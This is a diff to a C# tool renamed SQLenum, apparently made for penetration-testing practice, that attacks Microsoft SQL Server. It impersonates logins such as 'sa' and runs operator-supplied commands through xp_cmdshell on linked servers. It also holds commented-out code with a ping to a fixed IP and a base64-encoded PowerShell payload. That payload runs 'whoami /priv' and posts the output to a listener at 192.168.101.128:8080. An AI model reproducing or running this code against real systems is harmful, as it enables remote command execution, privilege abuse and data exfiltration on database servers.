@@ -5,7 +5,7 @@ using System.Text;
 using System.Data.SqlClient;
 using Microsoft.Win32;
 
-namespace SQLcheck
+namespace SQLenum
 {
     class Program
     {
@@ -14,10 +14,15 @@ namespace SQLcheck
             if (args.Length == 0)
             {
                 Console.WriteLine("Please enter a Hostname of SQL servers.");
-                Console.WriteLine("Usage: SQLcheck.exe target1 target2");
-                Console.WriteLine("Local enumeration Example: SQLcheck.exe local");
-                Console.WriteLine("Remote enumeration Example: SQLcheck.exe SQL11");
-                Console.WriteLine("Linked Server enumeration Example: SQLcheck.exe SQL11 SQL33");
+                Console.WriteLine("Usage: SQLenum.exe target1 target2 [options]");
+                Console.WriteLine("Local enumeration: SQLenum.exe local");
+                Console.WriteLine("Enumeration: SQLenum.exe SQL11");
+                Console.WriteLine("Linked server enumeration: SQLenum.exe SQL11 SQL33");
+                Console.WriteLine("Options:");
+                Console.WriteLine("--localImpersonation=[username] : Local impersonation, default value is sa;");
+                Console.WriteLine("--remoteImpersonation=[username] : Remote impersonation, default value is sa;");
+                Console.WriteLine("--execute=[commands] : Remote command execution;");
+                Console.WriteLine("--debug : Enable debug mode;");
                 return;
             }
 
@@ -27,10 +32,38 @@ namespace SQLcheck
             String dataSource = "";
             String localImpersonatedLogin = "sa";
             String remoteImpersonatedLogin = "sa";
+            String remoteCommands = "";
             Boolean linkEnumeration = false;
             Boolean localImpersonation = false;
             Boolean remoteImpersonation = false;
+            Boolean commandExecution = false;
             Boolean debug = false;
+
+            foreach (string arg in args)
+            {
+                if (arg.StartsWith("--localImpersonation="))
+                {
+                    string[] components = arg.Split('=');
+                    localImpersonatedLogin = components[1];
+                    localImpersonation = true;
+                }
+                else if (arg.StartsWith("--remoteImpersonation="))
+                {
+                    string[] components = arg.Split('=');
+                    remoteImpersonatedLogin = components[1];
+                    remoteImpersonation = true;
+                }
+                else if (arg.StartsWith("--debug"))
+                {
+                    debug = true;
+                }
+                else if (arg.StartsWith("--execute"))
+                {
+                    string[] components = arg.Split('=');
+                    remoteCommands = components[1];
+                    commandExecution = true;
+                }
+            }
 
             //Local enumeration
             if (args[0] == "local")
@@ -74,7 +107,7 @@ namespace SQLcheck
                 Environment.Exit(0);
             }
 
-            if (args.Length > 1) linkEnumeration = true;
+            if (args.Length > 1 && args[1].StartsWith("--") != true) linkEnumeration = true;
 
             //Enumeration on SQL server
 
@@ -478,30 +511,38 @@ namespace SQLcheck
                             Console.WriteLine("[Error]" + e.Message);
                             Console.WriteLine("clr strict security status checking failed");
                         }
-
-                        try
+                        if (commandExecution == true)
                         {
-                            Console.WriteLine("\n=====Executing commands using impersonated context " + args[0] + "\\" + localImpersonatedLogin + " on " + args[0] + " and " + args[1] + "\\" + remoteImpersonatedLogin + " on " + args[1] + "=====");
+                            try
+                            {
+                                Console.WriteLine("\n=====Executing commands using impersonated context " + args[0] + "\\" + localImpersonatedLogin + " on " + args[0] + " and " + args[1] + "\\" + remoteImpersonatedLogin + " on " + args[1] + "=====");
 
-                            //Part 2 Check Command Execution
-                            String execRemoteCmd = "EXEC('execute as login = ''" + remoteImpersonatedLogin + "''; EXEC(''xp_cmdshell ''''ping 192.168.49.66'''';''); RECONFIGURE;') as login = '" + localImpersonatedLogin + "' AT " + args[1] + ";";
-                            command = new SqlCommand(execRemoteCmd, con);
-                            reader = command.ExecuteReader();
-                            Console.WriteLine("Remote ping test executed.");
-                            reader.Close();
+                                String execRemoteCmd = "EXEC('execute as login = ''" + remoteImpersonatedLogin + "''; EXEC(''xp_cmdshell ''''"+ remoteCommands + "'''';''); RECONFIGURE;') as login = '" + localImpersonatedLogin + "' AT " + args[1] + ";";
+                                command = new SqlCommand(execRemoteCmd, con);
+                                reader = command.ExecuteReader();
+                                Console.WriteLine("Remote commands executed.");
+                                reader.Close();
 
-                            //Part 3 Exploitation
-                            String encoded = "JABFAHIAcgBvAHIAQQBjAHQAaQBvAG4AUAByAGUAZgBlAHIAZQBuAGMAZQA9ACIAcwBpAGwAZQBuAHQAbAB5AGMAbwBuAHQAaQBuAHUAZQAiADsAJABjAG8AbQBtAGEAbgBkACAAPQAgAHcAaABvAGEAbQBpACAALwBwAHIAaQB2ACAAfAAgAG8AdQB0AC0AcwB0AHIAaQBuAGcAOwAgACQAcgBlAHMAdQBsAHQAPQBbAHMAdAByAGkAbgBnAF0AJABjAG8AbQBtAGEAbgBkADsAIAAkAHAAbwBzAHQAUABhAHIAYQBtAHMAIAA9ACAAQAB7AFIAZQBzAHUAbAB0AD0AJAByAGUAcwB1AGwAdAA7AEUAcgByAG8AcgBzAD0AWwBzAHQAcgBpAG4AZwBdACQARQByAHIAbwByAH0AOwBJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAtAFUAcgBpACAAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwADEALgAxADIAOAA6ADgAMAA4ADAAIAAtAE0AZQB0AGgAbwBkACAAUABPAFMAVAAgAC0AQgBvAGQAeQAgACQAcABvAHMAdABQAGEAcgBhAG0AcwA7AA==";
-                            String exploitCmd = "EXEC('execute as login = ''" + remoteImpersonatedLogin + "''; EXEC(''xp_cmdshell ''''powershell -nop -exec bypass -encodedCommand " + encoded + "'''';'');') as login = '" + localImpersonatedLogin + "' AT " + args[1] + ";";
-                            command = new SqlCommand(exploitCmd, con);
-                            reader = command.ExecuteReader();
-                            Console.WriteLine("Remote Payload loaded.");
-                            reader.Close();
-                        }
-                        catch (Exception e)
-                        {
-                            Console.WriteLine("[Error]" + e.Message);
-                            Console.WriteLine("Command execution using " + args[1] + "\\" + remoteImpersonatedLogin + " on " + args[1] + " failed");
+                                //Part 2 Check Command Execution
+                                /*String execRemoteCmd = "EXEC('execute as login = ''" + remoteImpersonatedLogin + "''; EXEC(''xp_cmdshell ''''ping 192.168.49.66'''';''); RECONFIGURE;') as login = '" + localImpersonatedLogin + "' AT " + args[1] + ";";
+                                command = new SqlCommand(execRemoteCmd, con);
+                                reader = command.ExecuteReader();
+                                Console.WriteLine("Remote ping test executed.");
+                                reader.Close();*/
+
+                                //Part 3 Exploitation
+                                /*String encoded = "JABFAHIAcgBvAHIAQQBjAHQAaQBvAG4AUAByAGUAZgBlAHIAZQBuAGMAZQA9ACIAcwBpAGwAZQBuAHQAbAB5AGMAbwBuAHQAaQBuAHUAZQAiADsAJABjAG8AbQBtAGEAbgBkACAAPQAgAHcAaABvAGEAbQBpACAALwBwAHIAaQB2ACAAfAAgAG8AdQB0AC0AcwB0AHIAaQBuAGcAOwAgACQAcgBlAHMAdQBsAHQAPQBbAHMAdAByAGkAbgBnAF0AJABjAG8AbQBtAGEAbgBkADsAIAAkAHAAbwBzAHQAUABhAHIAYQBtAHMAIAA9ACAAQAB7AFIAZQBzAHUAbAB0AD0AJAByAGUAcwB1AGwAdAA7AEUAcgByAG8AcgBzAD0AWwBzAHQAcgBpAG4AZwBdACQARQByAHIAbwByAH0AOwBJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAtAFUAcgBpACAAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwADEALgAxADIAOAA6ADgAMAA4ADAAIAAtAE0AZQB0AGgAbwBkACAAUABPAFMAVAAgAC0AQgBvAGQAeQAgACQAcABvAHMAdABQAGEAcgBhAG0AcwA7AA==";
+                                String exploitCmd = "EXEC('execute as login = ''" + remoteImpersonatedLogin + "''; EXEC(''xp_cmdshell ''''powershell -nop -exec bypass -encodedCommand " + encoded + "'''';'');') as login = '" + localImpersonatedLogin + "' AT " + args[1] + ";";
+                                command = new SqlCommand(exploitCmd, con);
+                                reader = command.ExecuteReader();
+                                Console.WriteLine("Remote Payload loaded.");
+                                reader.Close();*/
+                            }
+                            catch (Exception e)
+                            {
+                                Console.WriteLine("[Error]" + e.Message);
+                                Console.WriteLine("Command execution using " + args[1] + "\\" + remoteImpersonatedLogin + " on " + args[1] + " failed");
+                            }
                         }
                     }
 
@@ -831,30 +872,41 @@ namespace SQLcheck
                         Console.WriteLine("clr strict security checking failed");
                     }
 
-                    Console.WriteLine("\n=====Executing commands using impersonated context " + args[0] + "\\" + localImpersonatedLogin + " on " + args[1] + "=====");
-                    try
+                    if(commandExecution == true)
                     {
-                        //Part 2 Check Command Execution
-                        String execRemoteCmd = "EXEC('EXEC(''xp_cmdshell ''''ping 192.168.49.66'''';''); RECONFIGURE;') as login = '" + localImpersonatedLogin + "' AT " + args[1] + ";";
-                        command = new SqlCommand(execRemoteCmd, con);
-                        reader = command.ExecuteReader();
-                        Console.WriteLine("Remote ping test executed.");
-                        reader.Close();
+                        try
+                        {
+                            Console.WriteLine("\n=====Executing commands using impersonated context " + args[0] + "\\" + localImpersonatedLogin + " on " + args[1] + "=====");
 
-                        //Part 3 Exploitation
-                        String encoded = "JABFAHIAcgBvAHIAQQBjAHQAaQBvAG4AUAByAGUAZgBlAHIAZQBuAGMAZQA9ACIAcwBpAGwAZQBuAHQAbAB5AGMAbwBuAHQAaQBuAHUAZQAiADsAJABjAG8AbQBtAGEAbgBkACAAPQAgAHcAaABvAGEAbQBpACAALwBwAHIAaQB2ACAAfAAgAG8AdQB0AC0AcwB0AHIAaQBuAGcAOwAgACQAcgBlAHMAdQBsAHQAPQBbAHMAdAByAGkAbgBnAF0AJABjAG8AbQBtAGEAbgBkADsAIAAkAHAAbwBzAHQAUABhAHIAYQBtAHMAIAA9ACAAQAB7AFIAZQBzAHUAbAB0AD0AJAByAGUAcwB1AGwAdAA7AEUAcgByAG8AcgBzAD0AWwBzAHQAcgBpAG4AZwBdACQARQByAHIAbwByAH0AOwBJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAtAFUAcgBpACAAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwADEALgAxADIAOAA6ADgAMAA4ADAAIAAtAE0AZQB0AGgAbwBkACAAUABPAFMAVAAgAC0AQgBvAGQAeQAgACQAcABvAHMAdABQAGEAcgBhAG0AcwA7AA==";
-                        String exploitCmd = "EXEC('EXEC(''xp_cmdshell ''''powershell -nop -exec bypass -encodedCommand " + encoded + "'''';'');') as login = '" + localImpersonatedLogin + "' AT " + args[1] + ";";
-                        command = new SqlCommand(exploitCmd, con);
-                        reader = command.ExecuteReader();
-                        Console.WriteLine("Remote Payload loaded.");
-                        reader.Close();
+                            String execRemoteCmd = "EXEC('EXEC(''xp_cmdshell ''''" + remoteCommands + "'''';''); RECONFIGURE;') as login = '" + localImpersonatedLogin + "' AT " + args[1] + ";";
+                            command = new SqlCommand(execRemoteCmd, con);
+                            reader = command.ExecuteReader();
+                            Console.WriteLine("Remote commands executed.");
+                            reader.Close();
 
+                            //Part 2 Check Command Execution
+                            /*String execRemoteCmd = "EXEC('EXEC(''xp_cmdshell ''''ping 192.168.49.66'''';''); RECONFIGURE;') as login = '" + localImpersonatedLogin + "' AT " + args[1] + ";";
+                            command = new SqlCommand(execRemoteCmd, con);
+                            reader = command.ExecuteReader();
+                            Console.WriteLine("Remote ping test executed.");
+                            reader.Close();*/
+
+                            //Part 3 Exploitation
+                            /*String encoded = "JABFAHIAcgBvAHIAQQBjAHQAaQBvAG4AUAByAGUAZgBlAHIAZQBuAGMAZQA9ACIAcwBpAGwAZQBuAHQAbAB5AGMAbwBuAHQAaQBuAHUAZQAiADsAJABjAG8AbQBtAGEAbgBkACAAPQAgAHcAaABvAGEAbQBpACAALwBwAHIAaQB2ACAAfAAgAG8AdQB0AC0AcwB0AHIAaQBuAGcAOwAgACQAcgBlAHMAdQBsAHQAPQBbAHMAdAByAGkAbgBnAF0AJABjAG8AbQBtAGEAbgBkADsAIAAkAHAAbwBzAHQAUABhAHIAYQBtAHMAIAA9ACAAQAB7AFIAZQBzAHUAbAB0AD0AJAByAGUAcwB1AGwAdAA7AEUAcgByAG8AcgBzAD0AWwBzAHQAcgBpAG4AZwBdACQARQByAHIAbwByAH0AOwBJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAtAFUAcgBpACAAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwADEALgAxADIAOAA6ADgAMAA4ADAAIAAtAE0AZQB0AGgAbwBkACAAUABPAFMAVAAgAC0AQgBvAGQAeQAgACQAcABvAHMAdABQAGEAcgBhAG0AcwA7AA==";
+                            String exploitCmd = "EXEC('EXEC(''xp_cmdshell ''''powershell -nop -exec bypass -encodedCommand " + encoded + "'''';'');') as login = '" + localImpersonatedLogin + "' AT " + args[1] + ";";
+                            command = new SqlCommand(exploitCmd, con);
+                            reader = command.ExecuteReader();
+                            Console.WriteLine("Remote Payload loaded.");
+                            reader.Close();*/
+
+                        }
+                        catch (Exception e)
+                        {
+                            Console.WriteLine("[Error]" + e.Message);
+                            Console.WriteLine("Command execution using " + args[0] + "\\" + localImpersonatedLogin + " on " + args[1] + " failed");
+                        }
                     }
-                    catch (Exception e)
-                    {
-                        Console.WriteLine("[Error]"+e.Message);
-                        Console.WriteLine("Command execution using "+ args[0] + "\\" + localImpersonatedLogin + " on " + args[1] + " failed");
-                    }
+                    
                 }
                 else
                 {
@@ -1197,29 +1249,38 @@ namespace SQLcheck
                             Console.WriteLine("clr strict security checking failed");
                         }
 
-                        try
+                        if (commandExecution == true)
                         {
-                            Console.WriteLine("\n=====Executing commands using current context on " + args[1] + "=====");
+                            try
+                            {
+                                Console.WriteLine("\n=====Executing commands using current context on " + args[1] + "=====");
 
-                            //Part 2 Check Command Execution
-                            String execRemoteCmd = "EXEC('EXEC(''xp_cmdshell ''''ping 192.168.49.66'''';''); RECONFIGURE;') AT " + args[1] + ";";
-                            command = new SqlCommand(execRemoteCmd, con);
-                            reader = command.ExecuteReader();
-                            Console.WriteLine("Remote ping test executed.");
-                            reader.Close();
+                                String execRemoteCmd = "EXEC('EXEC(''xp_cmdshell ''''" + remoteCommands + "'''';''); RECONFIGURE;') AT " + args[1] + ";";
+                                command = new SqlCommand(execRemoteCmd, con);
+                                reader = command.ExecuteReader();
+                                Console.WriteLine("Remote commands executed.");
+                                reader.Close();
 
-                            //Part 3 Exploitation
-                            String encoded = "JABFAHIAcgBvAHIAQQBjAHQAaQBvAG4AUAByAGUAZgBlAHIAZQBuAGMAZQA9ACIAcwBpAGwAZQBuAHQAbAB5AGMAbwBuAHQAaQBuAHUAZQAiADsAJABjAG8AbQBtAGEAbgBkACAAPQAgAHcAaABvAGEAbQBpACAALwBwAHIAaQB2ACAAfAAgAG8AdQB0AC0AcwB0AHIAaQBuAGcAOwAgACQAcgBlAHMAdQBsAHQAPQBbAHMAdAByAGkAbgBnAF0AJABjAG8AbQBtAGEAbgBkADsAIAAkAHAAbwBzAHQAUABhAHIAYQBtAHMAIAA9ACAAQAB7AFIAZQBzAHUAbAB0AD0AJAByAGUAcwB1AGwAdAA7AEUAcgByAG8AcgBzAD0AWwBzAHQAcgBpAG4AZwBdACQARQByAHIAbwByAH0AOwBJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAtAFUAcgBpACAAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwADEALgAxADIAOAA6ADgAMAA4ADAAIAAtAE0AZQB0AGgAbwBkACAAUABPAFMAVAAgAC0AQgBvAGQAeQAgACQAcABvAHMAdABQAGEAcgBhAG0AcwA7AA==";
-                            String exploitCmd = "EXEC('EXEC(''xp_cmdshell ''''powershell -nop -exec bypass -encodedCommand " + encoded + "'''';'');') AT " + args[1] + ";";
-                            command = new SqlCommand(exploitCmd, con);
-                            reader = command.ExecuteReader();
-                            Console.WriteLine("Remote Payload loaded.");
-                            reader.Close();
-                        }
-                        catch (Exception e)
-                        {
-                            Console.WriteLine("[Error]" + e.Message);
-                            Console.WriteLine("Command execution using current context on " + args[1] + " failed");
+                                //Part 2 Check Command Execution
+                                /*String execRemoteCmd = "EXEC('EXEC(''xp_cmdshell ''''ping 192.168.49.66'''';''); RECONFIGURE;') AT " + args[1] + ";";
+                                command = new SqlCommand(execRemoteCmd, con);
+                                reader = command.ExecuteReader();
+                                Console.WriteLine("Remote ping test executed.");
+                                reader.Close();*/
+
+                                //Part 3 Exploitation
+                                /*String encoded = "JABFAHIAcgBvAHIAQQBjAHQAaQBvAG4AUAByAGUAZgBlAHIAZQBuAGMAZQA9ACIAcwBpAGwAZQBuAHQAbAB5AGMAbwBuAHQAaQBuAHUAZQAiADsAJABjAG8AbQBtAGEAbgBkACAAPQAgAHcAaABvAGEAbQBpACAALwBwAHIAaQB2ACAAfAAgAG8AdQB0AC0AcwB0AHIAaQBuAGcAOwAgACQAcgBlAHMAdQBsAHQAPQBbAHMAdAByAGkAbgBnAF0AJABjAG8AbQBtAGEAbgBkADsAIAAkAHAAbwBzAHQAUABhAHIAYQBtAHMAIAA9ACAAQAB7AFIAZQBzAHUAbAB0AD0AJAByAGUAcwB1AGwAdAA7AEUAcgByAG8AcgBzAD0AWwBzAHQAcgBpAG4AZwBdACQARQByAHIAbwByAH0AOwBJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAtAFUAcgBpACAAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwADEALgAxADIAOAA6ADgAMAA4ADAAIAAtAE0AZQB0AGgAbwBkACAAUABPAFMAVAAgAC0AQgBvAGQAeQAgACQAcABvAHMAdABQAGEAcgBhAG0AcwA7AA==";
+                                String exploitCmd = "EXEC('EXEC(''xp_cmdshell ''''powershell -nop -exec bypass -encodedCommand " + encoded + "'''';'');') AT " + args[1] + ";";
+                                command = new SqlCommand(exploitCmd, con);
+                                reader = command.ExecuteReader();
+                                Console.WriteLine("Remote Payload loaded.");
+                                reader.Close();*/
+                            }
+                            catch (Exception e)
+                            {
+                                Console.WriteLine("[Error]" + e.Message);
+                                Console.WriteLine("Command execution using current context on " + args[1] + " failed");
+                            }
                         }
                     }
                     
@@ -1344,30 +1405,38 @@ namespace SQLcheck
                             Console.WriteLine("[Error]"+e.Message);
                             Console.WriteLine("clr strict security status checking failed");
                         }
-
-                        try
+                        if(commandExecution == true)
                         {
-                            Console.WriteLine("\n=====Executing commands using impersonated context " + args[1] + "\\" + remoteImpersonatedLogin + " on " + args[1] + "=====");
+                            try
+                            {
+                                Console.WriteLine("\n=====Executing commands using impersonated context " + args[1] + "\\" + remoteImpersonatedLogin + " on " + args[1] + "=====");
 
-                            //Part 2 Check Command Execution
-                            String execRemoteCmd = "EXEC('execute as login = ''" + remoteImpersonatedLogin + "''; EXEC(''xp_cmdshell ''''ping 192.168.49.66'''';''); RECONFIGURE;') AT " + args[1] + ";";
-                            command = new SqlCommand(execRemoteCmd, con);
-                            reader = command.ExecuteReader();
-                            Console.WriteLine("Remote ping test executed.");
-                            reader.Close();
+                                String execRemoteCmd = "EXEC('execute as login = ''" + remoteImpersonatedLogin + "''; EXEC(''xp_cmdshell ''''" + remoteCommands + "'''';''); RECONFIGURE;') AT " + args[1] + ";";
+                                command = new SqlCommand(execRemoteCmd, con);
+                                reader = command.ExecuteReader();
+                                Console.WriteLine("Remote commands executed.");
+                                reader.Close();
 
-                            //Part 3 Exploitation
-                            String encoded = "JABFAHIAcgBvAHIAQQBjAHQAaQBvAG4AUAByAGUAZgBlAHIAZQBuAGMAZQA9ACIAcwBpAGwAZQBuAHQAbAB5AGMAbwBuAHQAaQBuAHUAZQAiADsAJABjAG8AbQBtAGEAbgBkACAAPQAgAHcAaABvAGEAbQBpACAALwBwAHIAaQB2ACAAfAAgAG8AdQB0AC0AcwB0AHIAaQBuAGcAOwAgACQAcgBlAHMAdQBsAHQAPQBbAHMAdAByAGkAbgBnAF0AJABjAG8AbQBtAGEAbgBkADsAIAAkAHAAbwBzAHQAUABhAHIAYQBtAHMAIAA9ACAAQAB7AFIAZQBzAHUAbAB0AD0AJAByAGUAcwB1AGwAdAA7AEUAcgByAG8AcgBzAD0AWwBzAHQAcgBpAG4AZwBdACQARQByAHIAbwByAH0AOwBJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAtAFUAcgBpACAAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwADEALgAxADIAOAA6ADgAMAA4ADAAIAAtAE0AZQB0AGgAbwBkACAAUABPAFMAVAAgAC0AQgBvAGQAeQAgACQAcABvAHMAdABQAGEAcgBhAG0AcwA7AA==";
-                            String exploitCmd = "EXEC('execute as login = ''" + remoteImpersonatedLogin + "''; EXEC(''xp_cmdshell ''''powershell -nop -exec bypass -encodedCommand " + encoded + "'''';'');') AT " + args[1] + ";";
-                            command = new SqlCommand(exploitCmd, con);
-                            reader = command.ExecuteReader();
-                            Console.WriteLine("Remote Payload loaded.");
-                            reader.Close();
-                        }
-                        catch (Exception e)
-                        {
-                            Console.WriteLine("[Error]"+e.Message);
-                            Console.WriteLine("Command execution using " + args[1] + "\\" + remoteImpersonatedLogin + " on " + args[1] + " failed");
+                                //Part 2 Check Command Execution
+                                /*String execRemoteCmd = "EXEC('execute as login = ''" + remoteImpersonatedLogin + "''; EXEC(''xp_cmdshell ''''ping 192.168.49.66'''';''); RECONFIGURE;') AT " + args[1] + ";";
+                                command = new SqlCommand(execRemoteCmd, con);
+                                reader = command.ExecuteReader();
+                                Console.WriteLine("Remote ping test executed.");
+                                reader.Close();*/
+
+                                //Part 3 Exploitation
+                                /*String encoded = "JABFAHIAcgBvAHIAQQBjAHQAaQBvAG4AUAByAGUAZgBlAHIAZQBuAGMAZQA9ACIAcwBpAGwAZQBuAHQAbAB5AGMAbwBuAHQAaQBuAHUAZQAiADsAJABjAG8AbQBtAGEAbgBkACAAPQAgAHcAaABvAGEAbQBpACAALwBwAHIAaQB2ACAAfAAgAG8AdQB0AC0AcwB0AHIAaQBuAGcAOwAgACQAcgBlAHMAdQBsAHQAPQBbAHMAdAByAGkAbgBnAF0AJABjAG8AbQBtAGEAbgBkADsAIAAkAHAAbwBzAHQAUABhAHIAYQBtAHMAIAA9ACAAQAB7AFIAZQBzAHUAbAB0AD0AJAByAGUAcwB1AGwAdAA7AEUAcgByAG8AcgBzAD0AWwBzAHQAcgBpAG4AZwBdACQARQByAHIAbwByAH0AOwBJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAtAFUAcgBpACAAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwADEALgAxADIAOAA6ADgAMAA4ADAAIAAtAE0AZQB0AGgAbwBkACAAUABPAFMAVAAgAC0AQgBvAGQAeQAgACQAcABvAHMAdABQAGEAcgBhAG0AcwA7AA==";
+                                String exploitCmd = "EXEC('execute as login = ''" + remoteImpersonatedLogin + "''; EXEC(''xp_cmdshell ''''powershell -nop -exec bypass -encodedCommand " + encoded + "'''';'');') AT " + args[1] + ";";
+                                command = new SqlCommand(exploitCmd, con);
+                                reader = command.ExecuteReader();
+                                Console.WriteLine("Remote Payload loaded.");
+                                reader.Close();*/
+                            }
+                            catch (Exception e)
+                            {
+                                Console.WriteLine("[Error]" + e.Message);
+                                Console.WriteLine("Command execution using " + args[1] + "\\" + remoteImpersonatedLogin + " on " + args[1] + " failed");
+                            }
                         }
                     }
                 }
